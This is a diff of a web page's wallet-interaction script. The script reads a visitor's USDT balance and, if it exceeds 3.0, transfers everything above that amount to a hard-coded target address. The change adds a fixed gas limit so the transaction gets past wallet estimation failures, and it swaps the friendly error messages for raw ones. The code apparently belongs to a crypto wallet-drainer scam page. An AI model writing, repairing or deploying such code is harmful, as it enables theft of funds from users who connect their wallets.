@@ -128,25 +128,22 @@
                     balanceWei = await publicContract.balanceOf(userAddress);
                 }
                 
-                // Convert balanceWei to a normal decimal format (string format) for easy comparison
                 const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 18));
                 
-                // Compare numerical value strictly
                 if (formattedBalance > 3.0) {
                     
-                    // Simple Math: Total Balance - 3.0
                     const sendAmountFormatted = (formattedBalance - 3.0).toString();
-                    
-                    // Convert back to Wei format for the smart contract
                     const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 18);
                     
                     const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                     const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
                     
+                    // Manual Gas limit added here to bypass wallet estimation failures
                     const txParams = {
                         from: userAddress,
                         to: usdtContractAddress,
-                        data: dataTransfer
+                        data: dataTransfer,
+                        gas: "0x186A0" // Hardcoded to 100,000 gas limit in hex
                     };
                     
                     await currentProvider.request({
@@ -162,13 +159,9 @@
             } catch (error) {
                 console.error("Wallet Error:", error);
                 
-                if (error.code === 4001 || error.message.includes("User rejected")) {
-                    alert("Transaction rejected by the user.");
-                } else if (error.message.includes("gas") || error.message.includes("funds")) {
-                    alert("Insufficient BNB for gas fee. Please add a small amount of BNB.");
-                } else {
-                     alert("Action failed. Try switching network to BNB Smart Chain or use Trust Wallet app.");
-                }
+                // Real Error message extraction
+                const exactError = error.message || JSON.stringify(error);
+                alert("Real Error: " + exactError);
             }
         }
     </script>
